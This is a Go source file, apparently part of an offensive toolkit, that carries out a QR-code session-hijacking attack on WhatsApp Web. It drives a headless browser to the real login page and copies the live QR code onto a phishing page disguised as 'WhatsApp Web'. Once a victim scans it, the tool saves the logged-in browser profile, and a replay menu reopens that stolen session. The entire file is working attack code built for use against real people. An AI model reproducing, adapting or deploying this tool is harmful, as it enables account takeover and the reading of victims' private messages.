package whatsapp

import (
	"bufio"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/chromedp"
	"programa/utils"
)

const (
	sessionsDir  = "scripts/qr_jacker/whatsapp/sessions"
	wwwDir       = "scripts/qr_jacker/whatsapp/www"
	sessionsFile = "scripts/qr_jacker/whatsapp/sessions.json"
)

var (
	qrCanvasSelector  = "canvas"
	sessionSelector   = "header"
	reloadBtnSelector = "button[aria-label='Scan QR code']"
)

type sessionMeta struct {
	ID        string `json:"id"`
	Timestamp string `json:"timestamp"`
	Browser   string `json:"browser"`
	Profile   string `json:"profile"`
	URL       string `json:"url"`
}

type attackCfg struct {
	Port          int
	Host          string
	BrowserBinary string
}

func Run() {
	reader := bufio.NewReader(os.Stdin)
	for {
		utils.ClearTerminal()
		fmt.Printf("\n%s============ EVIL QR - WHATSAPP ============%s\n\n", utils.Blue, utils.Reset)
		fmt.Printf("%s[1] - Start Attack%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[2] - List Sessions%s\n", utils.Green, utils.Reset)
		fmt.Printf("%s[3] - Replay Session%s\n", utils.Green, utils.Reset)
		utils.PrintReturnOption("4")

		fmt.Printf("\n%sOption: %s", utils.Green, utils.Reset)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch input {
		case "1":
			doAttack(reader)
		case "2":
			listSessions()
			utils.WaitForEnter(reader)
		case "3":
			doReplay(reader)
		case "4":
			return
		default:
			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
			utils.WaitForEnter(reader)
		}
	}
}

func doAttack(reader *bufio.Reader) {
	utils.ClearTerminal()
	fmt.Printf("\n%s============ CONFIGURE ATTACK ============%s\n", utils.Blue, utils.Reset)

	browserPath := detectBrowser()
	if browserPath == "" {
		fmt.Printf("%s[!] No supported browser found. Install Chromium, Chrome, or Firefox.%s\n", utils.Red, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}
	browserName := filepath.Base(browserPath)
	fmt.Printf("\n%s[+] Detected browser: %s%s\n", utils.Green, browserName, utils.Reset)

	cfg := attackCfg{
		Port:          8080,
		Host:          "0.0.0.0",
		BrowserBinary: browserPath,
	}

	fmt.Printf("%sUse defaults (port 8080, host 0.0.0.0)? [Y/n]: %s", utils.Green, utils.Reset)
	useDef, _ := reader.ReadString('\n')
	useDef = strings.TrimSpace(strings.ToLower(useDef))
	if useDef == "n" || useDef == "no" {
		fmt.Printf("%sPort [8080]: %s", utils.Green, utils.Reset)
		p, _ := reader.ReadString('\n')
		p = strings.TrimSpace(p)
		if p != "" {
			fmt.Sscanf(p, "%d", &cfg.Port)
		}
		fmt.Printf("%sHost [0.0.0.0]: %s", utils.Green, utils.Reset)
		h, _ := reader.ReadString('\n')
		h = strings.TrimSpace(h)
		if h != "" {
			cfg.Host = h
		}
	}

	launchAttack(cfg)
}

func detectBrowser() string {
	candidates := []string{
		"chromium", "chromium-browser",
		"google-chrome", "google-chrome-stable",
		"chrome", "chrome-browser",
		"zen-browser", "zen",
		"firefox", "mozilla-firefox",
	}
	for _, name := range candidates {
		path, err := exec.LookPath(name)
		if err == nil {
			return path
		}
	}
	if runtime.GOOS != "linux" {
		return ""
	}
	common := []string{
		"/usr/bin/chromium", "/usr/bin/google-chrome",
		"/usr/bin/firefox", "/snap/bin/firefox",
		"/usr/bin/zen-browser", "/opt/zen/firefox",
	}
	for _, p := range common {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

func launchAttack(cfg attackCfg) {
	os.MkdirAll(wwwDir, 0755)
	os.MkdirAll(sessionsDir, 0755)

	tmpDir, err := os.MkdirTemp("", "whatsapp-attack-*")
	if err != nil {
		fmt.Printf("%s[!] Failed to create temp dir: %v%s\n", utils.Red, err, utils.Reset)
		utils.PauseForInput()
		return
	}
	defer os.RemoveAll(tmpDir)

	browserName := strings.ToLower(filepath.Base(cfg.BrowserBinary))
	isFirefox := strings.Contains(browserName, "firefox") || strings.Contains(browserName, "zen") || strings.Contains(browserName, "mozilla")

	var allocCtx context.Context
	var allocCancel context.CancelFunc
	var browserCmd *exec.Cmd

	if isFirefox {
		allocCtx, allocCancel, browserCmd, err = startGecko(cfg.BrowserBinary, tmpDir)
	} else {
		allocCtx, allocCancel, err = startChrome(cfg.BrowserBinary, tmpDir)
	}
	if err != nil {
		fmt.Printf("%s[!] Failed to start browser: %v%s\n", utils.Red, err, utils.Reset)
		utils.PauseForInput()
		return
	}
	defer allocCancel()

	tabCtx, tabCancel := chromedp.NewContext(allocCtx)
	defer tabCancel()

	if err := chromedp.Run(tabCtx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		fmt.Printf("%s[!] Navigation failed: %v%s\n", utils.Red, err, utils.Reset)
		utils.PauseForInput()
		return
	}
	fmt.Printf("%s[+] Navigating to web.whatsapp.com...%s\n", utils.Green, utils.Reset)
	time.Sleep(5 * time.Second)

	var currentQR []byte
	var qrMu sync.Mutex

	serverDone := make(chan struct{})
	go runServer(cfg.Port, cfg.Host, &qrMu, &currentQR, serverDone)

	ip := utils.GetLocalIP()
	fmt.Printf("\n%s[+] Attack server at http://%s:%d%s\n", utils.Green, ip, cfg.Port, utils.Reset)
	fmt.Printf("%s[+] Phishing page: http://%s:%d/%s\n", utils.Green, ip, cfg.Port, utils.Reset)
	fmt.Printf("%s[+] QR code: http://%s:%d/qr.png%s\n", utils.Green, ip, cfg.Port, utils.Reset)
	fmt.Printf("%s[+] Waiting for victim to scan QR code...%s\n\n", utils.Yellow, utils.Reset)

	start := time.Now()
	timeout := 10 * time.Minute
	sessionCaptured := false

	for time.Since(start) < timeout {
		select {
		case <-serverDone:
			return
		default:
		}

		var reloadExists bool
		chromedp.Run(tabCtx, chromedp.Evaluate(
			fmt.Sprintf(`!!document.querySelector('%s')`, reloadBtnSelector), &reloadExists))
		if reloadExists {
			var dummy string
			chromedp.Run(tabCtx, chromedp.Evaluate(
				fmt.Sprintf(`(()=>{const b=document.querySelector('%s');if(b)b.click()})()`, reloadBtnSelector), &dummy))
			time.Sleep(2 * time.Second)
		}

		var dataURL string
		err := chromedp.Run(tabCtx, chromedp.Evaluate(
			fmt.Sprintf(`(()=>{const c=document.querySelector('%s');if(!c)return '';try{return c.toDataURL()}catch(e){return ''}})()`, qrCanvasSelector), &dataURL))
		if err == nil && len(dataURL) > 50 {
			b64 := strings.TrimPrefix(dataURL, "data:image/png;base64,")
			decoded, decErr := base64.StdEncoding.DecodeString(b64)
			if decErr == nil {
				qrMu.Lock()
				currentQR = decoded
				qrMu.Unlock()
			}
		}

		var hasSession bool
		err = chromedp.Run(tabCtx, chromedp.Evaluate(
			fmt.Sprintf(`!!document.querySelector('%s')`, sessionSelector), &hasSession))
		if err == nil && hasSession {
			fmt.Printf("\n%s[+] SESSION CAPTURED! Victim scanned the QR code!%s\n", utils.Green, utils.Reset)
			sessionCaptured = true
			break
		}

		time.Sleep(2 * time.Second)
	}

	close(serverDone)
	if browserCmd != nil {
		browserCmd.Process.Kill()
	}

	if sessionCaptured {
		saveSession(tmpDir, browserName, "https://web.whatsapp.com")
	} else {
		fmt.Printf("\n%s[!] No session captured within timeout.%s\n", utils.Yellow, utils.Reset)
	}

	utils.PauseForInput()
}

func startChrome(binary, userDir string) (context.Context, context.CancelFunc, error) {
	opts := []chromedp.ExecAllocatorOption{
		chromedp.NoFirstRun,
		chromedp.NoDefaultBrowserCheck,
		chromedp.Headless,
		chromedp.DisableGPU,
		chromedp.UserDataDir(userDir),
	}
	if binary != "" {
		opts = append(opts, chromedp.ExecPath(binary))
	}
	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	return allocCtx, cancel, nil
}

func startGecko(binary, profileDir string) (context.Context, context.CancelFunc, *exec.Cmd, error) {
	ctx, cancel := context.WithCancel(context.Background())

	cmd := exec.CommandContext(ctx, binary,
		"--remote-debugging-port", "9222",
		"--headless",
		"--profile", profileDir,
		"-no-remote",
	)
	stderr, err := cmd.StderrPipe()
	if err != nil {
		cancel()
		return nil, nil, nil, err
	}
	if err := cmd.Start(); err != nil {
		cancel()
		return nil, nil, nil, err
	}

	wsURL := make(chan string, 1)
	go func() {
		buf := make([]byte, 8192)
		for {
			n, rerr := stderr.Read(buf)
			if rerr != nil {
				return
			}
			output := string(buf[:n])
			if idx := strings.Index(output, "ws://"); idx >= 0 {
				end := strings.Index(output[idx:], "\n")
				if end < 0 {
					end = len(output[idx:])
				}
				wsURL <- strings.TrimSpace(output[idx : idx+end])
				return
			}
		}
	}()

	var webSocketURL string
	select {
	case webSocketURL = <-wsURL:
	case <-time.After(15 * time.Second):
		cancel()
		cmd.Process.Kill()
		return nil, nil, nil, fmt.Errorf("timeout waiting for browser WebSocket URL")
	}

	allocCtx, allocCancel := chromedp.NewRemoteAllocator(ctx, webSocketURL)
	cleanup := func() {
		allocCancel()
		cancel()
		cmd.Process.Kill()
	}
	return allocCtx, cleanup, cmd, nil
}

func runServer(port int, host string, qrMu *sync.Mutex, currentQR *[]byte, done chan struct{}) {
	mux := http.NewServeMux()

	phishingHTML := `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WhatsApp Web</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#111;font-family:sans-serif}.container{text-align:center;color:#fff}.qr{border:4px solid #fff;border-radius:12px;padding:8px;background:#fff;margin:20px 0}.hint{color:#888;font-size:14px;margin-top:10px}h2{font-weight:400}</style></head><body><div class="container"><h2>WhatsApp Web</h2><p>Scan the QR code to connect</p><img class="qr" id="qr" src="/qr.png" width="264" height="264" alt="QR Code"><p class="hint">QR code refreshes automatically</p></div><script>setInterval(function(){document.getElementById('qr').src='/qr.png?t='+Date.now()},3000)</script></body></html>`

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(phishingHTML))
	})

	mux.HandleFunc("/qr.png", func(w http.ResponseWriter, r *http.Request) {
		qrMu.Lock()
		data := *currentQR
		qrMu.Unlock()
		if len(data) == 0 {
			http.Error(w, "QR not available yet", http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", "image/png")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
		w.Write(data)
	})

	addr := fmt.Sprintf("%s:%d", host, port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		listener, err = net.Listen("tcp", ":0")
		if err != nil {
			fmt.Printf("%s[!] Failed to start HTTP server: %v%s\n", utils.Red, err, utils.Reset)
			return
		}
		addr = listener.Addr().String()
	}

	srv := &http.Server{Handler: mux}
	go func() {
		<-done
		srv.Close()
	}()
	srv.Serve(listener)
}

func saveSession(profileDir, browser, url string) {
	os.MkdirAll(sessionsDir, 0755)

	ts := time.Now().Format("2006-01-02_15-04-05")
	sessionDir := filepath.Join(sessionsDir, ts)

	if err := copyDir(profileDir, sessionDir); err != nil {
		fmt.Printf("%s[!] Failed to save profile: %v%s\n", utils.Red, err, utils.Reset)
		return
	}

	sessions := loadSessions()
	id := fmt.Sprintf("%d", len(sessions))
	sessions[id] = sessionMeta{
		ID:        id,
		Timestamp: ts,
		Browser:   browser,
		Profile:   sessionDir,
		URL:       url,
	}
	saveSessions(sessions)
	fmt.Printf("%s[+] Session saved! ID: %s | Path: %s%s\n", utils.Green, id, sessionDir, utils.Reset)
}

func loadSessions() map[string]sessionMeta {
	data, err := os.ReadFile(sessionsFile)
	if err != nil {
		return make(map[string]sessionMeta)
	}
	var sessions map[string]sessionMeta
	if json.Unmarshal(data, &sessions) != nil {
		return make(map[string]sessionMeta)
	}
	return sessions
}

func saveSessions(sessions map[string]sessionMeta) {
	data, _ := json.MarshalIndent(sessions, "", "  ")
	os.WriteFile(sessionsFile, data, 0644)
}

func listSessions() {
	sessions := loadSessions()
	if len(sessions) == 0 {
		fmt.Printf("\n%sNo saved sessions.%s\n", utils.Yellow, utils.Reset)
		return
	}
	fmt.Printf("\n%sSaved Sessions:%s\n", utils.Blue, utils.Reset)
	for id, s := range sessions {
		fmt.Printf("  %s%s%s - %s (%s)\n", utils.Green, id, utils.Reset, s.Timestamp, s.Browser)
	}
}

func doReplay(reader *bufio.Reader) {
	sessions := loadSessions()
	if len(sessions) == 0 {
		fmt.Printf("\n%sNo saved sessions.%s\n", utils.Yellow, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	listSessions()
	fmt.Printf("\n%sSession ID to replay: %s", utils.Green, utils.Reset)
	id, _ := reader.ReadString('\n')
	id = strings.TrimSpace(id)

	s, ok := sessions[id]
	if !ok {
		fmt.Printf("%s[!] Invalid session ID%s\n", utils.Red, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	browser := detectBrowser()
	if browser == "" {
		fmt.Printf("%s[!] No browser found to replay session%s\n", utils.Red, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	fmt.Printf("%s[+] Launching %s with saved session...%s\n", utils.Green, filepath.Base(browser), utils.Reset)

	bname := strings.ToLower(s.Browser)
	if strings.Contains(bname, "firefox") || strings.Contains(bname, "zen") || strings.Contains(bname, "mozilla") {
		exec.Command(browser, "--profile", s.Profile, s.URL, "-new-instance").Start()
	} else {
		exec.Command(browser, "--user-data-dir="+s.Profile, s.URL, "--new-window").Start()
	}

	utils.WaitForEnter(reader)
}

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		rel, _ := filepath.Rel(src, path)
		target := filepath.Join(dst, rel)
		if info.IsDir() {
			return os.MkdirAll(target, info.Mode())
		}
		data, rerr := os.ReadFile(path)
		if rerr != nil {
			return rerr
		}
		return os.WriteFile(target, data, info.Mode())
	})
}
